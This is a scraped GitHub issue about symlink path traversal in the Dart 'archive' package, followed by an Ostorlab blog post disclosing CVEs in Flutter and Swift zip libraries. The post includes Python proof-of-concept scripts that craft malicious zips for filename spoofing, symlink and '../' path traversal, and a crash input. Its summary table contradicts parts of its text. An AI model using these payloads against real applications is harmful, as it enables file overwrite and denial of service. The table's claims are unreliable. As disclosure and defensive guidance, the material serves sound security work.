=== Content from github.com_b6792fe5_20250110_221434.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fbrendan-duncan%2Farchive%2Fissues%2F265)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fbrendan-duncan%2Farchive%2Fissues%2F265)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=brendan-duncan%2Farchive)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[brendan-duncan](/brendan-duncan)
/
**[archive](/brendan-duncan/archive)**
Public

* [Notifications](/login?return_to=%2Fbrendan-duncan%2Farchive) You must be signed in to change notification settings
* [Fork
  146](/login?return_to=%2Fbrendan-duncan%2Farchive)
* [Star
   426](/login?return_to=%2Fbrendan-duncan%2Farchive)

* [Code](/brendan-duncan/archive)
* [Issues
  113](/brendan-duncan/archive/issues)
* [Pull requests
  1](/brendan-duncan/archive/pulls)
* [Discussions](/brendan-duncan/archive/discussions)
* [Actions](/brendan-duncan/archive/actions)
* [Projects
  0](/brendan-duncan/archive/projects)
* [Wiki](/brendan-duncan/archive/wiki)
* [Security](/brendan-duncan/archive/security)
* [Insights](/brendan-duncan/archive/pulse)

Additional navigation options

* [Code](/brendan-duncan/archive)
* [Issues](/brendan-duncan/archive/issues)
* [Pull requests](/brendan-duncan/archive/pulls)
* [Discussions](/brendan-duncan/archive/discussions)
* [Actions](/brendan-duncan/archive/actions)
* [Projects](/brendan-duncan/archive/projects)
* [Wiki](/brendan-duncan/archive/wiki)
* [Security](/brendan-duncan/archive/security)
* [Insights](/brendan-duncan/archive/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Fbrendan-duncan%2Farchive%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Fbrendan-duncan%2Farchive%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# Archive is vulnerable to symlink path traversal #265

Closed

[BlueSquare1](/BlueSquare1) opened this issue
Jun 20, 2023
· 2 comments

Closed

# [Archive is vulnerable to symlink path traversal](#top) #265

[BlueSquare1](/BlueSquare1) opened this issue
Jun 20, 2023
· 2 comments

## Comments

[![@BlueSquare1](https://avatars.githubusercontent.com/u/129080649?s=80&u=3e402e1222cc7620f46b3944de5f448d070aa35d&v=4)](/BlueSquare1)

Copy link

### **[BlueSquare1](/BlueSquare1)** commented [Jun 20, 2023](#issue-1765811320) • edited Loading

| Hello,  while doing some security testing on `archive` package, we noticed that it supports symlinks, while symlinks might be an intended functionality of your package, we do believe that symlinks pointing outside the extraction directory are more of a security risk than a feature, below is an example where we created a symlink pointing to a file `secret.txt` in the parent directory, zipped it and extracted it using `extractFileToDisk` method from `archive` package, the symlink was created back after extraction.  [Screenshot from my workstation](https://private-user-images.githubusercontent.com/129080649/247196540-0e2b01f7-1477-4037-9669-ae8eb3ba0ae6.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NDc1NzMsIm5iZiI6MTczNjU0NzI3MywicGF0aCI6Ii8xMjkwODA2NDkvMjQ3MTk2NTQwLTBlMmIwMWY3LTE0NzctNDAzNy05NjY5LWFlOGViM2JhMGFlNi5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTEwJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExMFQyMjE0MzNaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT1mZGZmZjQ0NzM0NWM1MjBiNDUzN2MwYTdiZWI3OWQ5NzI0YWQxZTI4YWZhNWJiMTQ4Y2FiN2ZkYThmZTYwMmM3JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.9WUYUv9LZNjID6-4Yh6CzS_dZ8VqQEC0H_GyBIsKbWU) *Screenshot from my workstation*  [Screenshot from my mobile device](https://private-user-images.githubusercontent.com/129080649/247196986-b8298ced-ac3f-4838-90fa-3822363c3510.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NDc1NzMsIm5iZiI6MTczNjU0NzI3MywicGF0aCI6Ii8xMjkwODA2NDkvMjQ3MTk2OTg2LWI4Mjk4Y2VkLWFjM2YtNDgzOC05MGZhLTM4MjIzNjNjMzUxMC5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTEwJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExMFQyMjE0MzNaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT00YzJhOTgzMTFjNTUwYWZlZWIwZjA5ODZjNDBhNWEzN2I5NDE3ZmQ0YzFkYTcyMjFhMzM3NzAxNzM1MGMxNjE3JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.CrmQbXBVjvqztP0toYhF53Vmr9ddepMuaWkvGH0RRTw) *Screenshot from my test mobile device* |
| --- |
| The text was updated successfully, but these errors were encountered: |

All reactions

[![@BlueSquare1](https://avatars.githubusercontent.com/u/129080649?s=40&u=3e402e1222cc7620f46b3944de5f448d070aa35d&v=4)](/BlueSquare1)
[BlueSquare1](/BlueSquare1)
changed the title
~~Zip extraction recreates symlinks pointing outside the extraction directory~~
Archive is vulnerable to symlink path traversal
[Jul 24, 2023](#event-9899914687)

[![@brendan-duncan](https://avatars.githubusercontent.com/u/3642099?s=80&u=1eccb3bc87f6a9101118997e7d41cb9103dcf101&v=4)](/brendan-duncan)

Copy link

Owner

### **[brendan-duncan](/brendan-duncan)** commented [Sep 1, 2023](#issuecomment-1702958264)

| I updated extractArchiveToDisk and extractFileToDisk to not create symlinks that begin with '..' or '/', which would be outside of the extracted path. |
| --- |

All reactions

Sorry, something went wrong.

[![@brendan-duncan](https://avatars.githubusercontent.com/u/3642099?s=40&u=1eccb3bc87f6a9101118997e7d41cb9103dcf101&v=4)](/brendan-duncan)
[brendan-duncan](/brendan-duncan)
closed this as [completed](/brendan-duncan/archive/issues?q=is%3Aissue+is%3Aclosed+archived%3Afalse+reason%3Acompleted)
[Sep 3, 2023](#event-10265177807)

[![@jonasfj](https://avatars.githubusercontent.com/u/149732?s=80&u=17cbae8bf5ca4019b4b9094865ff9ee407939fc8&v=4)](/jonasfj)

Copy link

Contributor

### **[jonasfj](/jonasfj)** commented [Sep 5, 2023](#issuecomment-1706449982)

| [@brendan-duncan](https://github.com/brendan-duncan) you could consider referencing the CVE in your changelog: [GHSA-9v85-q87q-g4vg](https://github.com/advisories/GHSA-9v85-q87q-g4vg "GHSA-9v85-q87q-g4vg") |
| --- |

 👍
1
 brendan-duncan reacted with thumbs up emoji

All reactions

* 👍
  1 reaction

Sorry, something went wrong.

[![@alestiago](https://avatars.githubusercontent.com/u/44524995?s=40&v=4)](/alestiago)
[alestiago](/alestiago)
mentioned this issue
[Jul 29, 2024](#ref-issue-2424782252)

[Fail retrieving vulnerable dependencies unless overriden
dart-lang/pub#4333](/dart-lang/pub/issues/4333)

Open

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Fbrendan-duncan%2Farchive%2Fissues%2F265)

Assignees

No one assigned

Labels

None yet

Projects

None yet

Milestone

No milestone

Development

No branches or pull requests

3 participants

[![@jonasfj](https://avatars.githubusercontent.com/u/149732?s=52&v=4)](/jonasfj) [![@brendan-duncan](https://avatars.githubusercontent.com/u/3642099?s=52&v=4)](/brendan-duncan) [![@BlueSquare1](https://avatars.githubusercontent.com/u/129080649?s=52&v=4)](/BlueSquare1)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from ostorlab.co_33152285_20250110_221434.html ===




=== Content from blog.ostorlab.co_6e64aa4c_20250110_221433.html ===


mdi-slash-forward
## [Blog](https://blog.ostorlab.co/)

Engineering

Product

Security

Documentation

Changelog

Login

Demo

mdi-menu

Engineering

Product

Security

Documentation

Changelog

Login

Demo

[Security](https://blog.ostorlab.co/category/security.html)

# ZIP Exploitation: Critical Vulnerabilities Found in Popular Zip Libraries in Swift and Flutter

Recent in-depth investigations reveal serious vulnerabilities discovered in widely-used zip packages in Flutter and Swift, posing serious security risks for thousands of developers and applications. Our article delves into the technical aspects of these vulnerabilities, explaining their discovery, implications and mitigation strategies.

#

Author

[Ostorlab Team](https://blog.ostorlab.co/author/ostorlab-team.html)

`Fri 04 August 2023`

mdi-github

mdi-linkedin

mdi-twitter

mdi-youtube

# Introduction

ZIP packages are compressed archives that contain multiple files and directories, allowing developers to conveniently bundle resources, libraries, and other components required for app functionality. While ZIP packages offer efficiency and ease of use, they can also be the source of potential security vulnerabilities that malicious actors can exploit.

This article will delve into the security of zip-handling implementation, showcasing vulnerabilities in popular Zip libraries in the Swift and Dart (Flutter) ecosystems. We will explore the potential risks associated with malicious ZIP packages and the consequences they can have on mobile application security. Furthermore, we will discuss best practices and effective strategies to ensure the robust protection of ZIP packages throughout the development lifecycle.

# Anatomy of ZIP file

ZIP files typically follow this layout:

```
+------------------------------------------------------+
|                  Local File Header                   |
| +----------------------------------------------+     |
| | Local File Header Signature (4 bytes)       |     |
| | Version Needed to Extract (2 bytes)         |     |
| | General Purpose Bit Flag (2 bytes)          |     |
| | Compression Method (2 bytes)                |     |
| | Last Mod Time (2 bytes)                     |     |
| | Last Mod Date (2 bytes)                     |     |
| | CRC-32 Checksum (4 bytes)                   |     |
| | Compressed Size (4 bytes)                   |     |
| | Uncompressed Size (4 bytes)                 |     |
| | Filename Length (2 bytes)                  |     |
| | Extra Field Length (2 bytes)               |     |
| +----------------------------------------------+     |
| | Filename (variable length)                         | |
| |                                                  | |
| +----------------------------------------------+     |
| | Extra Field (variable length)                      | |
| |                                                  | |
| +----------------------------------------------+     |
|               Compressed Data                          |
|                                                      |
| +----------------------------------------------+     |
| | Data Descriptor (optional)                        | |
| | +------------------------------------------+ |     |
| | | CRC-32 Checksum (4 bytes)                | |     |
| | | Compressed Size (4 bytes)                | |     |
| | | Uncompressed Size (4 bytes)              | |     |
| | +------------------------------------------+ |     |
| +----------------------------------------------+     |
+------------------------------------------------------+
+------------------------------------------------------+
|                Central Directory                      |
| +----------------------------------------------+     |
| | Central Directory File Header              |     |
| | +--------------------------------------+ |     |
| | | Central Directory Header Signature  | |     |
| | | Version Made by (2 bytes)            | |     |
| | | Version Needed to Extract (2 bytes)  | |     |
| | | General Purpose Bit Flag (2 bytes)   | |     |
| | | ...                                | |     |
| | +--------------------------------------+ |     |
| | | CRC-32 Checksum (4 bytes)            | |     |
| | | Compressed Size (4 bytes)            | |     |
| | | Uncompressed Size (4 bytes)          | |     |
| | | Filename Length (2 bytes)            | |     |
| | | ...                                | |     |
| | +--------------------------------------+ |     |
| | | Filename (variable length)           | |     |
| | |                                    | |     |
| | +--------------------------------------+ |     |
| +----------------------------------------------+     |
+------------------------------------------------------+
+------------------------------------------------------+
|       End of Central Directory Record                |
| +----------------------------------------------+     |
| | End of Central Directory Signature (4 bytes) |     |
| | ...                                        |     |
| +----------------------------------------------+     |
+------------------------------------------------------+

```

Notable parts of the zip structure are:

* **Local File Header:** The Local File Header is a section at the beginning of each file within a ZIP archive. It contains essential information about the compressed file, such as its name, size, compression method, and other attributes. This header allows the software to locate and extract individual files from the ZIP archive.
* **Data Descriptor:** The Data Descriptor is an optional section within the ZIP file format. It provides additional information about a file's compressed data. The purpose of the Data Descriptor is to store the CRC-32 checksum of the uncompressed data, the compressed size, and the uncompressed size. Including this information allows for integrity checks and can be useful when extracting files.
* **Central Directory File Header:** The Central Directory File Header is a section in a ZIP file that contains metadata about each file within the archive. It provides details such as the file name, compressed size, uncompressed size, compression method, and other attributes. The Central Directory File Header is located in the central directory structure, a catalog of all the files in the ZIP archive.
* **End of Central Directory Record (EOCD):** The End of Central Directory (EOCD) Record is a section at the end of a ZIP file that marks the end of the central directory structure. It contains essential information, including the number of entries in the central directory, the size of the central directory, and the offset to the start of the central directory. The EOCD record allows the software to locate and access the central directory, which provides information about the files in the ZIP archive.

# Common ZIP vulnerabilities:

* **ZIP path traversal**: Zip path traversal, also known as Zip Slip, is a security vulnerability that occurs when the application fails to validate zip entries' file names during extraction. It allows an attacker to extract files to arbitrary locations outside the extraction directory, which helps overwrite sensitive user data and, in some cases, can lead to code execution if an attacker overwrites an application's shared object file.
* **ZIP filename spoofing**: In the context of ZIP archives, there are two main data structures relevant to file names: the `Central Directory Entry` and the `Local File Header`, if a parser for example, reads the filename from `Local File Header` but then proceeds to extract the file with the path in the `Central Directory Entry`.
* **ZIP symlink path traversal**: ZIP symlink is a feature used in many zip utilities that allows those symlinks to point to files outside the extraction directory. This can pose a security risk, leading to overwriting sensitive data or shared object files, which might lead to code execution.
* **ZIP Bomb**: A zip bomb is a small-sized zip file that contains an enormous amount of compressed data. When extracted, it expands into a huge file or consumes excessive system resources, potentially causing denial-of-service (DoS).

# ZIP packages to analyze

## Archive

One of the popular flutter packages for handling compressed files is `archive` by Brendan Duncan, this package implements popular archive formats natively in Dart without having to go through the native platform-specific packages like `java.util.zip` for android or `ZIPFoundation` for iOS.

Language: **Dart (Flutter)**

Link: <https://pub.dev/packages/archive>

## Flutter\_archive

`flutter_archive` is another Flutter package for compressed files that work exclusively with zip files, this package relies on Java's native zip package `java.util.zip` by leveraging Flutter's `MethodChannel`.

Language: **Dart (Flutter)**

Link: <https://pub.dev/packages/flutter_archive>

## ZIPFoundation

`ZIPFoundation` is a library to create, read and modify ZIP archive files. It is written in Swift and based on Apple's libcompression for high performance and energy efficiency.

Language: **Swift**

Link: <https://github.com/weichsel/ZIPFoundation>

## ZIP

`Zip` is a Swift framework for zipping and unzipping files. Simple and quick to use. Built on top of minizip.

Language: **Swift**

Link: <https://github.com/marmelroy/Zip>

## ZIPArchive (SSZIPArchive)

ZipArchive is a simple utility class for zipping and unzipping files on iOS, macOS and tvOS.

Language: **Swift**

Link: <https://github.com/ZipArchive/ZipArchive>

# Detected vulnerabilities

## Package: [Archive](https://github.com/brendan-duncan/archive)

### ZIP filename spoofing (CVE-2023-39137)

`archive` package only parses the filename from the `Local File Header`, this leads to inconsistency with most zip parsers who typically favor `Central Directory Entry`, this inconsistency can be abused by attackers who can craft a malicious zip file with different file names in `Local File Header` and `Central Directory Entry`, consequently having a file with different filenames before and after extraction.

```
  String filename = '';
  List<int> extraField = [];
  String fileComment = '';
  ZipFile? file;

  ZipFileHeader(
      [InputStreamBase? input, InputStreamBase? bytes, String? password]) {
    if (input != null) {
      versionMadeBy = input.readUint16();
      versionNeededToExtract = input.readUint16();
      generalPurposeBitFlag = input.readUint16();
      compressionMethod = input.readUint16();
      lastModifiedFileTime = input.readUint16();
      lastModifiedFileDate = input.readUint16();
      crc32 = input.readUint32();
      compressedSize = input.readUint32();
      uncompressedSize = input.readUint32();
      final fnameLen = input.readUint16();
      final extraLen = input.readUint16();
      final commentLen = input.readUint16();
      diskNumberStart = input.readUint16();
      internalFileAttributes = input.readUint16();
      externalFileAttributes = input.readUint32();
      localHeaderOffset = input.readUint32();

      if (fnameLen > 0) {
        filename = input.readString(size: fnameLen);
      }

```

To test this, we crafted a zip file with different filename field values *evil.apk* and *evil.txt* respectively for `Local File Header` and `Central Directory Entry`

**Proof of concept code:**

```
import zipfile

def generate_spoofed_zip(filename):
    with zipfile.ZipFile('payload.zip', 'w') as zipf:
        zipf.writestr(filename, "Test payload")

    with open('payload.zip', 'rb') as zipf:
        zip_data = zipf.read()
        spoofed_data = zip_data.replace(bytes(filename, 'utf-8'), bytes(spoofed_filename, 'utf-8'), 1)

    with open('payload.zip', 'wb') as zipf:
        zipf.write(spoofed_data)

original_filename = 'evil.txt'
spoofed_filename = 'evil.apk'

if len(original_filename) != len(spoofed_filename):
    raise ValueError("Filenames lengths must be equal")

generate_spoofed_zip(original_filename)

```

![zip file hexdump](https://blog.ostorlab.co/static/img/archive_zip/zipfile_hexdump.png "Zip file hex dump")

Zip file hex dump

when we ran `zipinfo` utility over our zip file, the filename inside was parsed as `evil.txt`

![zipinfo](https://blog.ostorlab.co/static/img/archive_zip/zipinfo.png "zipinfo over our zip file")

zipinfo over our zip file

However, after extracting the file using `extractFileToDisk` function from `archive` package, the filename was parsed as `evil.apk`

![zip file extracted](https://blog.ostorlab.co/static/img/archive_zip/extracted_zipfile.png "Extracted zip file")

Extracted zip file

### ZIP symlink path traversal (CVE-2023-39139)

Another interesting finding we found while inspecting the package was not only it links symlinks back after extraction, it also links ones pointing to any path, even outside the extraction directory.

```
  for (final file in archive.files) {
    final filePath = p.join(outputPath, p.normalize(file.name));

    if (!isWithinOutputPath(outputPath, filePath)) {
      continue;
    }

    if (!file.isFile && !file.isSymbolicLink) {
      Directory(filePath).createSync(recursive: true);
      continue;
    }

    if (asyncWrite) {
      if (file.isSymbolicLink) {
        final link = Link(filePath);
        await link.create(p.normalize(file.nameOfLinkedFile), recursive: true);
      } else {
        final output = File(filePath);
        final f = await output.create(recursive: true);
        final fp = await f.open(mode: FileMode.write);
        final bytes = file.content as List<int>;
        await fp.writeFrom(bytes);
        file.clear();
        futures.add(fp.close());
      }

```

To test that we created a symlink *evil* pointing to a file (*secret.txt*) in the parent directory, we zipped that symlink using the command `zip --symlinks poc.zip evil` and extracted `poc.zip` on an Android test device using `extractFileToDisk` function.

**Proof of concept code:**

```
import zipfile

def compress_file(filename):
    zipInfo = zipfile.ZipInfo(".")
    zipInfo.create_system = 3
    zipInfo.external_attr = 2716663808
    zipInfo.filename = filename

    with zipfile.ZipFile('payload.zip', 'w') as zipf:
        zipf.writestr(zipInfo, "/etc/hosts")

filename = 'evil'

compress_file(filename)

```

![symlink workstation](https://blog.ostorlab.co/static/img/archive_zip/symlink_workstation.png "Symlink poc in our workstation")

Symlink poc in our workstation

Upon extracting the zip file, the symlink was linked back and pointing to `../secret.txt`, outside the extraction directory.

![symlink android](https://blog.ostorlab.co/static/img/archive_zip/symlink_android.png "Symlink after extraction on android device")

Symlink after extraction on android device

## Package: [ZIPFoundation](https://github.com/weichsel/ZIPFoundation)

### ZIP symlink path traversal (CVE-2023-39138)

Upon extraction, the package passes the path coming from the zip entry directly to `fileManager.createSymbolicLink` without checking that it is located within extraction directory, we replicated the same test above and found this package too allows symlinks pointing outside the extraction directory.

```
case .symlink:
    guard !fileManager.itemExists(at: url) else {
        throw CocoaError(.fileWriteFileExists, userInfo: [NSFilePathErrorKey: url.path])
    }
    let consumer = { (data: Data) in
        guard let linkPath = String(data: data, encoding: .utf8) else { throw ArchiveError.invalidEntryPath }
        try fileManager.createParentDirectoryStructure(for: url)
        try fileManager.createSymbolicLink(atPath: url.path, withDestinationPath: linkPath)
    }
    checksum = try self.extract(entry, bufferSize: bufferSize, skipCRC32: skipCRC32,
                                progress: progress, consumer: consumer)
}

```
### ZIP path traversal (CVE-2023-39138)

the package uses the function `isContained` to check that the zip entry path is located within the extraction directory:

```
func isContained(in parentDirectoryURL: URL) -> Bool {
        // Ensure this URL is contained in the passed in URL
        let parentDirectoryURL = URL(fileURLWithPath: parentDirectoryURL.path, isDirectory: true).standardized
        return self.standardized.absoluteString.hasPrefix(parentDirectoryURL.absoluteString)
    }
...
guard entryURL.isContained(in: destinationURL) else {
        throw CocoaError(.fileReadInvalidFileName,
                         userInfo: [NSFilePathErrorKey: entryURL.path])
    }
...
crc32 = try archive.extract(entry, to: entryURL, skipCRC32: skipCRC32, progress: entryProgress)

```

Below is a code snippet of the `extract` function:

```
public func extract(_ entry: Entry, to url: URL, bufferSize: Int = defaultReadChunkSize, skipCRC32: Bool = false,
                        progress: Progress? = nil) throws -> CRC32 {
        guard bufferSize > 0 else {
            throw ArchiveError.invalidBufferSize
        }
        let fileManager = FileManager()
        var checksum = CRC32(0)
        switch entry.type {
        case .file:
            guard !fileManager.itemExists(at: url) else {
                throw CocoaError(.fileWriteFileExists, userInfo: [NSFilePathErrorKey: url.path])
            }
            try fileManager.createParentDirectoryStructure(for: url)
            let destinationRepresentation = fileManager.fileSystemRepresentation(withPath: url.path)
            guard let destinationFile: FILEPointer = fopen(destinationRepresentation, "wb+") else {
                throw POSIXError(errno, path: url.path)
            }
            defer { fclose(destinationFile) }
            let consumer = { _ = try Data.write(chunk: $0, to: destinationFile) }
            checksum = try self.extract(entry, bufferSize: bufferSize, skipCRC32: skipCRC32,
                                        progress: progress, consumer: consumer)

```

When provided with the following path `/base_path/extraction_directory//../` the path gets normalized to `/base_path/extraction_directory/entry_file_name` which passes the check above.
When that same path is passed to `fopen`, it gets normalized to `/base_path/entry_file_name`, allowing us to write files outside the extraction directory.

**Proof of concept code:**

```
import zipfile

def compress_file(filename):
    with zipfile.ZipFile('payload.zip', 'w') as zipf:
        zipf.writestr(filename, "Test payload")

filename = '/../secret.txt'

compress_file(filename)

```
## Package: [Zip](https://github.com/marmelroy/Zip)

### ZIP path traversal (CVE-2023-39135)

Below is a code snippet from the `unzipFile` function used to extract zip files, you can notice that `pathString` coming from our zip entry is appended to the `destination` directory without any sanitization

```
let fileNameSize = Int(fileInfo.size_filename) + 1
//let fileName = UnsafeMutablePointer<CChar>(allocatingCapacity: fileNameSize)
let fileName = UnsafeMutablePointer<CChar>.allocate(capacity: fileNameSize)

unzGetCurrentFileInfo64(zip, &fileInfo, fileName, UInt(fileNameSize), nil, 0, nil, 0)
fileName[Int(fileInfo.size_filename)] = 0

var pathString = String(cString: fileName)

guard pathString.count > 0 else {
    throw ZipError.unzipFail
}

var isDirectory = false
let fileInfoSizeFileName = Int(fileInfo.size_filename-1)
if (fileName[fileInfoSizeFileName] == "/".cString(using: String.Encoding.utf8)?.first || fileName[fileInfoSizeFileName] == "\\".cString(using: String.Encoding.utf8)?.first) {
    isDirectory = true;
}
free(fileName)
if pathString.rangeOfCharacter(from: CharacterSet(charactersIn: "/\\")) != nil {
    pathString = pathString.replacingOccurrences(of: "\\", with: "/")
}

let fullPath = destination.appendingPathComponent(pathString).path

```

**Proof of concept code:**

```
import zipfile

def compress_file(filename):
    with zipfile.ZipFile('payload.zip', 'w') as zipf:
        zipf.writestr(filename, "Test payload")

filename = '../secret.txt'

compress_file(filename)

```
## Package: [ZIPArchive (SSZIPArchive)](https://github.com/ZipArchive/ZipArchive)

### Denial of Service (CVE-2023-39136)

Below is a code snippet from the `_sanitizedPath` function used to sanitize zip entries filenames, the code prepends `file:///` prefix to the zip entry path, standardizes it using `NSURL` then removes the prepended prefix, however when presented with `/..` as a path, the output of `NSURL` becomes `file://`, which has 7 characters while the code expects at least 8 characters, this unhandled edge case leads to crashing the application.

```
if (strPath == nil) {
        return nil;
    }

// Add scheme "file:///" to support sanitation on names with a colon like "file:a/../../../usr/bin"
strPath = [@"file:///" stringByAppendingString:strPath];

// Sanitize path traversal characters to prevent directory backtracking. Ignoring these characters mimics the default behavior of the Unarchiving tool on macOS.
// "../../../../../../../../../../../tmp/test.txt" -> "tmp/test.txt"
// "a/b/../c.txt" -> "a/c.txt"
strPath = [NSURL URLWithString:strPath].standardizedURL.absoluteString;

// Remove the "file:///" scheme
strPath = [strPath substringFromIndex:8];

```

**Proof of concept code:**

```
import zipfile

def compress_file(filename):
    with zipfile.ZipFile('payload.zip', 'w') as zipf:
        zipf.writestr(filename, "Test payload")

filename = '/..'

compress_file(filename)

```
# Summary table

| Package | Language | ZIP Filename Spoofing | ZIP Symlink | ZIP Path Traversal | Denial of Service |
| --- | --- | --- | --- | --- | --- |
| Archive | Dart (Flutter) | Vulnerable | Not Vulnerable | Not Vulnerable | Not Vulnerable |
| Flutter\_archive | Dart (Flutter) | Not Vulnerable | Not Vulnerable | Not Vulnerable | Not Vulnerable |
| ZIPFoundation | Swift | Not Vulnerable | Vulnerable | Vulnerable | Not Vulnerable |
| ZIP | Swift | Not Vulnerable | Not Vulnerable | Vulnerable | Not Vulnerable |
| ZIPArchive | Swift | Not Vulnerable | Not Vulnerable | Not Vulnerable | Vulnerable |

# Conclusion

In conclusion, ZIP vulnerabilities pose significant security risks that developers should be aware of when handling archive files. The ZIP file format, although widely used and supported, is not immune to exploitation. Understanding and addressing these vulnerabilities is essential to safeguarding sensitive data and preventing potential attacks.

This article has highlighted several common ZIP vulnerabilities, including ZIP path traversal, ZIP filename spoofing, ZIP symlink vulnerability, and ZIP bomb attacks. Each of these vulnerabilities exposes different risks, such as unauthorized access to files, overwriting sensitive data, denial-of-service (DoS) and even code execution in some scenarios.

It is important for developers to implement robust security measures when working with ZIP files. This includes validating zip entry file names during extraction to prevent path traversal attacks, ensuring consistency between the filenames in the Local File Header and Central Directory Entry to mitigate filename spoofing, restricting access permissions for extracted files, and implementing proper decompression techniques to prevent DoS situations caused by ZIP bombs.

Additionally, it is crucial to stay informed about security updates and patches related to ZIP libraries or packages used in development frameworks. Regularly reviewing and updating these dependencies can help mitigate known vulnerabilities and protect against emerging threats.

It is worth mentioning that the issues discussed in this article were reported to the concerned authors.

Tags:

[flutter](https://blog.ostorlab.co/tag/flutter.html),  [swift](https://blog.ostorlab.co/tag/swift.html),  [zip](https://blog.ostorlab.co/tag/zip.html),  [security](https://blog.ostorlab.co/tag/security.html),  [archive](https://blog.ostorlab.co/tag/archive.html),  [vulnerability](https://blog.ostorlab.co/tag/vulnerability.html),  [exploitation](https://blog.ostorlab.co/tag/exploitation.html)

We do newsletters, too

---

Get the latest news, updates, and product innovations from Ostorlab right in your inbox.

Subscribe

Table of Contents

---

* [Introduction](#introduction "Introduction")
